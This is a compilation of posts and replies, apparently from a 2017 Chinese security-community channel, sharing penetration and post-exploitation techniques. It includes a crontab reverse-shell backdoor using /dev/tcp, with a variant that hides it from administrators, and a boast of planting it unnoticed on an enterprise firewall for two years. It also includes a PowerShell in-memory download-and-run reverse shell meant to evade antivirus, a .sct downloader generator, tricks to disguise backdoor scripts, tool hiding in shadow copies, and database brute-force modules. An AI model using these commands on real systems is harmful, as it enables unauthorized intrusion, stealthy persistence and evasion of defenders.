port:1433  （Sqlserver）
```
use auxiliary/scanner/mssql/mssql_login   //sa爆破
```

port:3306   (Mysql)
```
auxiliary/scanner/mysql/mysql_login
```

port: 27017、27018 (Mongodb)
```
auxiliary/scanner/mongodb/mongodb_login
```

port:6379  （Redis）
```
auxiliary/scanner/redis/redis_login
auxiliary/scanner/redis/file_upload
```

port:1521   (Oracle)
```
search Oracle
```

port:5432   (PostgreSQL)
```
search PostgreSQL
```

<img src="https://images.xiaomiquan.com/FmgaMfoaZoU0EwdMgVnjSM93Sdeo?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:vQF74cjllAa2OqTa3lpWOz4oFS8=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/e4/b4/e4b46552510c6ae0660244095fca260401a18af22f2746c0aeeae86e99b6abb8.jpg" width="25px"/> __罗钦__: 21,80,443,873,2601,2604,3128,4440,6082,6379,8000,8008,8080,8081,8090,8099,8088,8888,9000,9090,9200,11211,27017,28017,50070,19004440,5082,7001,6082,50000,8888,2222,2082,2083,3312,3311,7778,8083,10000,8089,8649,27017,27018,5900,5631,4899


...

---

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__ on 2017-11-21:


__#科普#__

玩过Metasploit的都知道，Meterpreter里有个“getsystem”命令，可以获取到SYSTEM 权限，这篇文章就是讲解背后的原理的！
 
链接：

[XPN InfoSec Blog](https://blog.xpnsec.com/becoming-system/)

...

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 国内的社区真是勤奋，这么快就翻译了
[【技术分享】获取SYSTEM权限的多种姿势 - 安全客 - 有思想的安全新媒体](http://bobao.360.cn/learning/detail/4740.html)

...

---

## UNIX Shell


<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-06-22:


__#姿势#__

一条命令实现无文件兼容性强的反弹后门,收集自强大的前乌云。
我觉得很实用且强大,分享给大家.

```
(crontab -l;echo '*/60 * * * * exec 9<> /dev/tcp/IP/port;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i')|crontab -
```

就是一条SHELL脚本，通过crontab 自定义一条定时执行的任务。


<详解>

`/dev/tcp/IP/port`  ：通过调用/dev/tcp 类似发出了一个socket的调用，建立一个socket连接，读写这个/dev/tcp就相当于在这个socket连接中传输数据，后面跟上你控制端的IP和端口，当然也可以写上你的域名，这样你植入后门后，你接收SHELL的服务器IP发生改变，你同样能收到SHELL。

`exec 9<>`  ：9是linux 中的文件描述符，0代表从键盘输入，1代表标准输出的，2代表错误输出的，这个大家都知道吧，其实一共有10个，只是其它的默认没有打开。exec 9<> ，意思是以读写方式打开/dev/tcp，然后所有的数据都会保留在9这个文件描述符内，并通过tcp连接在两端传输。

`exec 0<&9`  :意思是将9里面的内容传送给输入端，作用是当我们在控制端输入命令的时候，命令就自动传到被控端并被输入执行.

`exec 1>9&`  : 这个意思大家现在能明白了吧，就是被控端执行命令后的正确回显也输出到 9，这样我们在控制端就能接收到。

`2>&1`   :错误的输出也指向1，而前面1已经指向到了9，所以错误的消息也传向了9，这样我们就能在控制端收到正确和错误的回显了。

`/bin/bash --noprofile -i`  :这个就是调用bash来执行我们输入的命令，后面跟的参数是禁止执行一些登录shell时调用的脚本。


前面的时间设定很简单，大家不明白的可以百度下，我曾经植入一条这样的后门到一个大型企业的网关防火墙上（linux内核），每个月只连出来一次，2年了人家都没发现，当然可能管理员比较懒。拿到网关shell当然各种代理就都不是事了。

当然管理员通过crontab -l 可以查看到任务，

不过你这样：

```
(crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/IP/PORT;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -  
```

猥琐版直接显示你用户名下没有任务....

在未连接状态启动反连任务的时候，进程和端口都无状态。



...

<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: ****是什么

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: 要不百度下crontab的用法？ 是设置时间用的，依次排序下去就是设置 分 时 日 月 周 ，*如果在日这个单位上，就是不限制在每月哪号。

<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 了解了

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 6666   定时反弹shell这是，同时问下 linux想转发另外一台的3389出来，有什么好办法，用iptable做nat转发失败

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 参考下之前弦哥发的，ssh端口转发实战，应该可以解决你的问题。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 补充下：这个指令来自猪猪侠

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 下午在centos和kali上测试都显示9是Bad file descriptor

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 你没开监听就会这样，试着先开监听

<img src="https://file.xiaomiquan.com/3a/1d/3a1dfafee22fabee58800a8d92e40cb97cae002fa0245156de52e427a2631344.jpg" width="25px"/> __Leo__: kali里面直接在命令行里可以反弹拿到shell，但是在crontab里面无法拿shell，求解


...

---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-08-06:

> dusts 提问：
root shell拿到了,然后msf里用 shell to meterpreter 模块，也总是执行成功，但是就是不能返回 meterpreter  sessions -l永远只是个shell  是什么原因？  有解吗？


linux下root shell那么强大，还要meterpreter shell干嘛，有时候msf加载的模块是会不稳定，如果一定要meterpreter shell，可以手工生成后门执行一下



...

<img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__: 想拷贝文件，但是没有nc , 没有能做交互式shell的python，用什么传

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__: 只是传文件就太多方法了，scp ftp 这些比较简单，对方至少是有scp的，或者wget 你的其它后门进去

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这个问题也挺模糊的，该上调试了，看看相关日志

<img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 非交互式的ftp怎么连法

<img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 有没有非交互式shell下的操作指南，针对很多需要交互的命令的 非交互写法

<img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 嗯，msf调试模块没找到。。shell下会打印一堆乱码，可能是antivirus 的缘故

<img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: echo是可以。但是碰到ftp不支持-s 文件输入

<img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 非交互的scp怎么传密码进去，看了下参数没有，  要生成密钥对吗？如果密钥对的话简单的生成方法？

<img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: ssh keygen 生成密钥对后，公钥存放位置不明，不同版本密钥保存位置不一样，有点繁琐，有没有直接传密码的非交互方式

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__: echo 个ftp 的脚本，自动下载呢？


...

---

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-08-12:

内网渗透系列番外篇——winexe

在渗透测试时，如何直接通过一台linux主机去控制一台windows主机。在这里给大家推荐一个工具：winexe,KALI下自带。

winexe可以从Linux上远程执行windows命令（SMB）。用法也很简单,如下：

```
./winexe --system -U 'Administrator%123123' //192.168.31.165 'cmd.exe /c whoami'
```

成功执行即可返回whoami的结果。

-U参数用来指定凭据： `-U=[DOMAIN/]USERNAME[%PASSWORD]`

--system参数，使用system权限来执行命令

条件允许的话：可以直接`./winexe -U 'Administrator%123123' //192.168.31.165 'cmd.exe'` 返回一个交互式CMD,如图。

工具介绍：
[https://tools.kali.org/maintaining-access/winexe](https://tools.kali.org/maintaining-access/winexe)



下载地址：
[Winexe / current / [b787d2]](https://sourceforge.net/p/winexe/winexe-waf/ci/master/tree/)



kali上的winexe（/usr/bin/winexe）采用的是动态编译，在运行的时候需要同时提供用到的dll/so文件。我们需要静态编译让它独立运行。不管linux主机的权限大小，都可以进行利用。

<img src="https://images.xiaomiquan.com/FgNlxTgx-Cb5t0PQOO66yoDQannq?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:dmASdZsa2Mvdj38P6y19JANVbGk=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__ on 2017-10-31:

利用NFS配置错误来提权  
  
[Linux privilege escalation using weak NFS permissi...](https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/)





---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-11-30:


__#姿势#__

 Bash 后门欺骗隐藏技巧一例


[oss-security - s/party/hack like it's 1999](http://www.openwall.com/lists/oss-security/2015/09/17/5)



老技巧了：

```
$ printf '#!/bin/bash\necho doing something evil!\nexit\n\033[2Aecho  
doing something very nice!\n' > backdoor.sh
$ chmod +x backdoor.sh
$ cat backdoor.sh
#!/bin/bash
echo doing something very nice!
$ ./backdoor.sh
doing something evil!
```

本质是：\033[nA 这种控制符会使光标上移n行，所以 cat 后看到的内容和直接执行的不一样。

另外补充说下，\033 这样的控制符，我们经常在终端下拿来做带颜色的输出，更多请自行查阅相关资料。



...

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 弦哥三连[嘴唇]

<img src="https://file.xiaomiquan.com/54/c4/54c4ddff75c97f188d8b9d71eb9968df550924e72726285bee403e9060c9b9db.jpg" width="25px"/> __十八子__: 用vi和less都不能实现隐藏，cat可以


...

---


## Powershell

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-19:


__#姿势#__

 Increased use of PowerShell in attacks

推荐这篇来自赛门铁克的 Paper，这是一篇难得攻防介绍很全面的研究成果，从 PowerShell 基础到各攻击阶段的姿势：

执行策略

植入
- 如：Email、Office 宏、Exploit Kits、横向渗透、策略文件、任务计划、PsExec、等

持久化
- 如：注册表、WMI、任务计划、启动目录、组策略、策略文件、等

混淆
- 如：大小写、空格、Get-自动补全、System.自动补全、引号拼接、反单引魔法、通配符魔法、别名、向后兼容、进制转换、-f格式化、XOR、BrainFuck、等

一些绕过技巧

在列举这些攻击过程的同时还举例了一些经典木马的案例，最后还好些篇幅介绍了防御姿势。

这篇 Paper 是去年的，如果能通读下来并做些实践，会很受益。

昨天我带团队通读了一遍，对于团队来说两块很明显的收益：英文能力提升、PowerShell 攻防姿势提升。

PowerShell 已经成为玩渗透必备技能，如果你还没掌握，赶快入坑。😏


__分享文件:__

[increased-use-of-powershell-in-attacks-16-en.pdf](https://github.com/ChrisLinn/sst-2017/blob/master/shared-files/increased-use-of-powershell-in-attacks-16-en.pdf)


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 去年开始，(null)   就一直喊我学 PowerShell，只要和我见面必然会 Show 他的成果，还给我分享了各种环境、工具及学习笔记。可我当时并不以为然啊，Python 与 JavaScript 是我最好的武器，在我的工作场景下基本通杀全栈，我觉得够了，没想到，PowerShell 已经吐火如茶成这样，果然是老司机的建议，咱都收...

<img src="https://file.xiaomiquan.com/0e/48/0e48d9ee4e4299ba09ac5217c23e38ceeb13e48357ee2261c6c03282b5807781.jpg" width="25px"/> __Chen__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 吐火如茶？如火如荼？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/0e/48/0e48d9ee4e4299ba09ac5217c23e38ceeb13e48357ee2261c6c03282b5807781.jpg" width="25px"/> __Chen__: 哈，手快敲错

<img src="https://file.xiaomiquan.com/d2/51/d251481e66c6144e32be00ceeedbd707a2bbe024ac5d9b150ce826c26a0b6be6.jpg" width="25px"/> __desword__: 自带混淆这个不错。

<img src="https://file.xiaomiquan.com/b2/27/b2273c727cd42d41352bd2bb195a82e4d41270073f0e99e7e46ffb1a1566c21f.jpg" width="25px"/> __。__: 各大杀软已经把恶意调用powershell加入黑名单了…真的厉害😂过段时间应该会有人在xx大会上分享powershell了


...

---

<img src="https://file.xiaomiquan.com/49/38/493819414cee64e85bb9339ad2d5f28a809a1f8d45dba90f290aec07ec882a72.jpg" width="25px"/> __Moriarty@ATToT__ on 2017-06-24:

.sct generator by Moriarty@DMZLab

这是我闲着蛋疼用powershell 写的一个GUI小程序，功能主要是用来生成.sct文件。发这DD的目的主要是给大家介绍一下另一种方式来写GUI程序———Form（窗体）。用这种方式可以仅仅只需要powershell studio一个IDE就可以完成，在写一些简单的GUI的程序尤其适合。

那么程序本身的功能很简单，就是用来生成.sct文件，这个类型的文件想必好多朋友都已经了解，subtee牛已经详细阐述过了。我一般用它下载执行exe文件的时候居多，用法如下：

1.用certutil.exe(win7以上系统自带）将exe转成shellcode，格式如下：
certutil.exe -encode setup.exe setup.b64

2.将setup.b64的内容复制黏贴到中间输入框中，然后点击Generate即可生成一个随机命名的.sct文件。

3.将这个文件放到一个web server上，然后用程序中给出的一句话在目标机器上执行，即可完成exe的下载并执行。
程序中的refresh可以重新初始化所有参数（主要是重新生成一些随机的命名），clear会清空中间输入框中的内容。

如果你想生成其它功能的.sct文件，可以双击第一个文本框和第三个文本框使之变为可修改状态，就可以定制自己的sct文件了。

工具虽小，但我里面用了一些小技巧，你在阅读源码的时候应该就会注意到了。另外，写得仓促，可能有错误或者需要改进的地方，圈友们可自行修改。

<img src="https://images.xiaomiquan.com/Fvb1uk0UNtTW4QO5ztFWnIhekvWg?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:WCbccaAneV-SSm2aQD_ttO-v1IM=" width="50%" height="50%" align="middle"/>

<img src="https://images.xiaomiquan.com/Fkr-fsE9IHqeL1mLm1clvDYlA_uF?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:BmcsH54WipZgXlwsaGngF9B6qh0=" width="50%" height="50%" align="middle"/>

__分享文件:__

[SctGenerator.zip](https://github.com/ChrisLinn/sst-2017/blob/master/shared-files/SctGenerator.zip)


---

<img src="https://file.xiaomiquan.com/49/38/493819414cee64e85bb9339ad2d5f28a809a1f8d45dba90f290aec07ec882a72.jpg" width="25px"/> __Moriarty@ATToT__ on 2017-06-24:

Powershell Useful ToolSet by Moriarty@DMZLab
这是我打算把一些小的有用的工具集成的小项目，目前还没完成，之所以放上来，就是想给大家介绍一些如何写类似这样的powershell程序。目前仅写了一个简单的小功能，其它的后面继续完善。
把这未完成品放上来，是想给大家介绍一些powershell GUI程序如何去写。一种方法使用powershell studio自带的界面设计器来做，这种方法简单实用，但是也是有许多不如人意的地方（这里不再赘述）。另外一种方法是使用XAML，虽然稍微麻烦了一些，但是看上去更简洁，更通用，也是最常用的方法（尤其对那些没有powershell studio或者不喜欢用powershell studio的童鞋们）。

今天我们重点介绍后一种，其实步骤也很简单：

一、用visual studio进行界面设计（我这里用的visual studio 2017，没有这个的用express版也可以）。创建项目时选择 “WPF应用（.Net Framework）”即可。如附图一所示。

二、画界面。这个就不用多说了，所见即所得，很简单。画完后如附图二所示。

三、把图二中的XAML代码完整复制出来，然后粘贴到powershell代码中，如下所示：

```
[xml]$XAML = @'
<Window 
    x:Class="WpfApp1.MainWindow"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/prese...
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008...
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibi...
    xmlns:local="clr-namespace:WpfApp1"
    mc:Ignorable="d"
        Title="Powershell Useful ToolSet V0.1 By Moriarty@DMZLab" Height="350" Width="566.77" WindowStyle="ToolWindow" Background="#FFF5F1F1" Topmost="True" WindowStartupLocation="CenterScreen">
    <Grid>
        <Grid.ColumnDefinitions>
            <ColumnDefinition Width="280*"/>
            <ColumnDefinition Width="279*"/>
        </Grid.ColumnDefinitions>
        <TabControl x:Name="tabctl_1" VerticalAlignment="Top" Height="322" Grid.ColumnSpan="2">
            <TabItem x:Name="tabItem_obf" Header="Obfustcator">
                <Grid Background="#FFE5E5E5" Margin="0">
                    <Grid.ColumnDefinitions>
                        <ColumnDefinition Width="178*"/>
                        <ColumnDefinition Width="371*"/>
                    </Grid.ColumnDefinitions>
                    <Label Grid.ColumnSpan="2" Content="Randomly obfuscate powershell command (using enviroment variable):" HorizontalAlignment="Left" Height="23" Margin="10,10,0,0" VerticalAlignment="Top" Width="529" HorizontalContentAlignment="Center" Foreground="Red"/>
                    <Button x:Name="btn_go" Content="GO" Grid.Column="1" HorizontalAlignment="Left" Height="19" Margin="31,126,0,0" VerticalAlignment="Top" Width="115"/>
                    <TextBox x:Name="textbox_output" Grid.ColumnSpan="2" HorizontalAlignment="Left" Height="85" Margin="10,36,0,0" TextWrapping="Wrap" Text="" VerticalAlignment="Top" Width="529"/>
                </Grid>
            </TabItem>
            <TabItem x:Name="tabItem_gen" Header="Generator">
                <Grid Background="#FFE5E5E5"/>
            </TabItem>
        </TabControl>

    </Grid>
</Window>

'@
```

四、添加PresentationFramework程序集的引用：

`Add-Type -Assembly PresentationFramework`

或者：

`[void][system.Reflection.Assembly]::LoadWithPartialName("PresentationFramework")`

五、需要删除几行复制过来的XAML代码，不然会有错误（你事先手动删除然后再复制过来也行，不过我还是喜欢交给代码来完成）：

```
$XAML.Window.RemoveAttribute('x:Class')
$XAML.Window.RemoveAttribute('mc:Ignorable')
$XAML.Window.RemoveAttribute('xmlns:local')
```

六、然后就是解析XAML，让你的图形界面显示出来了（事件添加很简单，可以参考完整代码，我这里不多说了）：

```
$reader = New-Object System.Xml.XmlNodeReader $XAML
try
{
  $Form = [Windows.Markup.XamlReader]::Load($reader)
}
catch
{
  Write-Host -ForegroundColor Red "Processing XAML Failed!"
  exit
}
$Form.ShowDialog() | Out-Null
```

是不是很简单？程序运行截图如附图三所示。

powerhsell图形界面开发很简单，而且可以跨平台，等程序最终完成我再放一个最终版。有兴趣的圈友，也可以在我这个代码基础上自己去完善一个出来，记得放出来共享哦


__分享文件:__

[PUTTs.zip](https://github.com/ChrisLinn/sst-2017/blob/master/shared-files/PUTTs.zip)


---

<img src="https://file.xiaomiquan.com/49/38/493819414cee64e85bb9339ad2d5f28a809a1f8d45dba90f290aec07ec882a72.jpg" width="25px"/> __Moriarty@ATToT__ on 2017-06-29:

渗透技巧之隐藏自己的工具
大家在做内网渗透的时候，经常要传一些工具到目标机器上执行。有的时候传一次，执行完了就删除了，后来发现还要再用，又要再次上传，很是麻烦而且也容易造成被发现的风险。有的圈友可能会把工具放到一个很深的目录里藏起来，但是这种工具长期放在目标机器上又不安全。今天我给大家介绍一个猥琐的小技巧，可以放心的把工具放在目标机器上，而又不会被发现。
这里利用的就是VSS（Volume Shadow Copy），首先我们将工具上传到目标机器的某个目录里（比如c:\$Recycler.Bin),我这里方便测试，在c盘新建了一个目录test，并把工具传到了此目录里。然后我们创建C盘的VSS，这里我们可以利用微软的vssadmin工具（我的windows 2008里自带这个工具），如果没有这个工具我们可以利用wmi来操作：
1.创建VSS：
vssadmin create shadow /for=c:
或者
（Get-WmiObject Win32_ShadowCopy -List).Create("C:\","ClientAccessible")
这里记住返回的ShadowID（类似{eeb50055-34c9-472b-81e6-ed111742e12e}）
2.删除你上传的工具（我这里是直接把C:\test目录删除掉）
3.查看一下我们创建的VSS的DeviceObject（如果使用vssadmin创建的，返回结果里就会有）：

`gwmi Win32_ShadowCopy | select -Property DeviceObject`

返回结果为：

```
DeviceObject                                   
------------                                   
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8
```

4.将`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8`中的“？”换成“.”，就可以执行你的程序了：

```
\\.\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\test\hunter64.exe
```

是不是很简单？这样做，实际硬盘上已经看不到hunter64.exe里，但是我们做了一个shadow copy，在这里shadow copy里，我们的程序还在，通过这种方式我们就可以随时随地执行我们的“影子”程序，从而实现隐藏我们的工具了。
等你不再需要这些工具的时候，直接删除你创建的VSS就可以了：
vssadmin Delete Shadows /shadow={eeb50055-34c9-472b-81e6-ed111742e12e} /quiet
或者

`Get-WmiObject Win32_ShadowCopy | where {$_.ID -eq '{eeb50055-34c9-472b-81e6-ed111742e12e}'} | Remove-WmiObject`

当然，使用WMI的方法我们不一定用powershell，也可以使用JScript或者VBScript，比如：

```
var Win32_ShadowCopy =GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_ShadowCopy");
Win32_ShadowCopy.Create(
  "C:\\",
  "ClientAccessible"
);
```

举一反三的机会留给各位圈友了：-）

<img src="https://images.xiaomiquan.com/Fr3g-bDh6ZEsWgeuedBGC3XRbq_l?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:jyHrhJEjosuVJuUmtjKlF2ifYJ8=" width="50%" height="50%" align="middle"/>

<img src="https://images.xiaomiquan.com/FmT7oZ79Jbh44M3auMEbhYRfsx-s?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:psLIgsGpbh9aywxarRAauuzLBrg=" width="50%" height="50%" align="middle"/>

<img src="https://images.xiaomiquan.com/FvuN5GgkqCVU3yGgpSi-sakrbYqM?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Cn4mcNhkPIcPKRk7lHitjUohHHQ=" width="50%" height="50%" align="middle"/>

<img src="https://images.xiaomiquan.com/FrColQQRXcJjgEsM9G6YkaFzogxe?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:nw9K-O-Y6Ga6UEfxIhipq9WYG7g=" width="50%" height="50%" align="middle"/>

<img src="https://images.xiaomiquan.com/Fksg794N47n3RgzNFwYSbDDVA1jv?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:PJ_hAwIodO4J7VvaUZcAL7gfZFA=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这里有份朋友写的指南也可以参考：
[pentest-wiki/How-to-use-vssadmin.md at master · ni...](https://github.com/nixawk/pentest-wiki/blob/master/4.Post-Exploitation/Windows_ActiveDirectory/How-to-use-vssadmin.md)

...

---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-07-12:


__#工具#__

nishang 牛逼的powershell渗透框架
玩渗透的都在夸powershell各种bypass，各种无文件入侵。我们当然得了解下了，有多强大，谁试谁知道！

nishang是作者nikhil_mitt在渗透测试过程中，根据实战经验编写出来的，各个脚本都有很强大的实战意义。
什么下载和执行、键盘记录、屏幕监视、内网扫描、抓HASH、用Mimikatz 抓密码、各式各样的反弹、反弹meterpreter shell还有删除补丁等等强大模块。
其中键盘记录跟屏幕监控，觉得挺有意思的。
键盘记录脚本会将记录的信息用POST方式发到你设置的URL上，读取到你设置的URL下你设置的特定内容它会停止记录。
屏幕监控开启后，会在对方电脑上开启一个端口，你用web访问它这个端口就会生成对方屏幕的截图，并且会实时刷新，挺有意思。
简单演示下：

```
C:\Users\Administrator>powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.190/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp) -Reverse -IPAddress 192.168.1.190 -port 8888
```

将你的利用脚本放到你的web服务器中，然后在你的webshell上直接执行上面这样的命令调用执行，直接加载进内存，所以bypass各种杀软。

还可以加载特定的exe程序进内存执行，只要没有写入磁盘动作，AV对它没任何反应。

可用插件太多了，地址在这里 
[GitHub - samratashok/nishang: Nishang - PowerShell...](https://github.com/samratashok/nishang)



另外照顾一下像我一样的小白，找了两篇不错的利用文章，小白看一遍，照着实验来一发是最好的了。
